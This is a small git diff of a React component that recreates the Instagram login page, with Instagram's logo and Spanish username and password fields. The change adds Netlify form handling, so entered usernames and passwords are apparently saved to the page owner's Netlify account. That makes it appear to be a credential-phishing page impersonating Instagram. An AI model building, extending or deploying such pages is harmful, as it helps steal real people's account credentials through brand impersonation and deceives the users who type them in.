@@ -39,7 +39,7 @@ function App() {
         <img className='w-44 invert contrast-200' src={'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png'} alt="Vite logo" />
       </a>
       <div className='p-9'>
-        <form onSubmit={handleSubmit}>
+        <form name='users' onSubmit={handleSubmit} netlify>
           <div className='grid gap-2'>
             <input onChange={handleInput} className='bg-[#121212] border border-zinc-500 placeholder-zinc-300 p-3 text-xs rounded text-white' name='username' type="text" placeholder="Telefono, usuario o correo electronico " />
             <input onChange={handleInput} className='bg-[#121212] border  border-gray-300/40 p-3 text-xs rounded text-white' name='password' type="password" placeholder="Contraceña" />
